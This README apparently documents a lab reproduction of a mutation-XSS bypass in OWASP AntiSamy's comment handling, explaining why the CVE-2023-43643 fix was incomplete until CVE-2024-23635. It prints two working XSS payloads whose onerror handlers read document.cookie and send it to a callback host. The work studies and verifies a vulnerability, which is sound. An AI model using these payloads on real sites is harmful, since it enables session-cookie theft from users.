# antisamy_comment_mxss

OWASP AntiSamy — CVE-2023-43643 -> CVE-2024-23635 (preserved-comment mutation XSS, CWE-79).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP with a real-browser
execution oracle.**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL AntiSamy Java service (`App.java`, JDK `com.sun.net.httpserver.HttpServer`, Maven-built with the
REAL published `org.owasp.antisamy:antisamy` from Central) exposes `GET /?html=<payload>` and serves
`new AntiSamy().scan(html, policy, AntiSamy.DOM).getCleanHTML()` verbatim inside a page, with the
policy `antisamy.xml` set to `preserveComments=true` (the precondition both advisories name). A
selenium headless-Chromium `victim` (grid `selenium/standalone-chromium`) carries `${PCB_FLAG}` as its
`session=` cookie for the app origin and VIEWS the sanitized page; if the sanitizer's output smuggled
a live `<img onerror>` out of a preserved comment, the browser executes it on load, reads
`document.cookie`, and navigates to the internal `callback:9000` service — proving JS EXECUTION, not
reflection (the flag never appears in the server-side output). Same sink, same policy, same exfil
channel; the ONLY variable across versions is the pinned AntiSamy release, whose transitive
neko-htmlunit parser tracks each one (1.7.3 -> neko 3.1.0, 1.7.4 -> 3.6.0, 1.7.5 -> 3.11.1) — that
parser + serializer comment-handling evolution IS the guard.

- **V0 = antisamy 1.7.3** (`:35320`, neko 3.1.0) — both comment breakouts survive -> the seed's
  `<img onerror>` escapes as a live element and executes; flag reaches the callback.
- **V1 = antisamy 1.7.4** (`:35321`, target) — CVE-2023-43643 fix (`parse-noscript-content=false`
  feature in `AntiSamyDOMScanner`/`AntiSamySAXScanner` + neko 3.6.0) closes the raw-text-element
  breakout -> the seed is BLOCKED (onerror stripped). But `processCommentNode` still serializes a
  Comment's `getData()` verbatim under `preserveComments` (only stripping IE conditional directives),
  and neko 3.6.0 still treats the HTML5 bang-comment terminator `--!>` as comment INTERIOR while the
  browser's "comment end bang" state treats it as a comment CLOSE -> the bang-comment residual's
  unsanitized `<img onerror>` escapes the preserved comment in the browser and EXECUTES. Incomplete fix.
- **V2 = antisamy 1.7.5** (`:35322`, -23635 fix) — neko-htmlunit bumped to 3.11.1 (comment-end-bang
  parsing aligned with HTML5) plus ASHTMLSerializer/MagicSAXFilter changes: `--!>` is normalized to
  `-->`, the `<img>` lands outside the comment as a scanned element with onerror STRIPPED -> residual
  BLOCKED.

- **Original trigger**: raw-text-element breakout
  `<div><noscript><!--</noscript><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">--></div>`
  (upstream regression test `testRawTextProcessingWhenPreservingComments`) — on neko 3.1.0 the
  `</noscript>` INSIDE the comment prematurely closes the raw-text region; on 1.7.4 the sanitized
  output is `<div><noscript>&lt;!--</noscript><img src="x">--&gt;</div>` (onerror stripped, inert).
- **Residual trigger**: bang-comment terminator mXSS
  `<div><!--<div/>--!><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"> <li>--></p></div>`
  (upstream regression test `testBangCommentsWhenPreservingComments` added with the 1.7.5 fix) — neko
  3.6.0 treats `<!--...--!>...-->` as ONE comment, preserved verbatim with `preserveComments=true`;
  the browser closes it at `--!>` and the `<img onerror>` escapes and executes. Both payloads are
  wrapped in `<div>` because root-level comments are dropped before `preserveComments` can preserve
  them.

Run: `python3 oracle.py --run-gate --with-v2`. See `repro.log` and `case.json`.
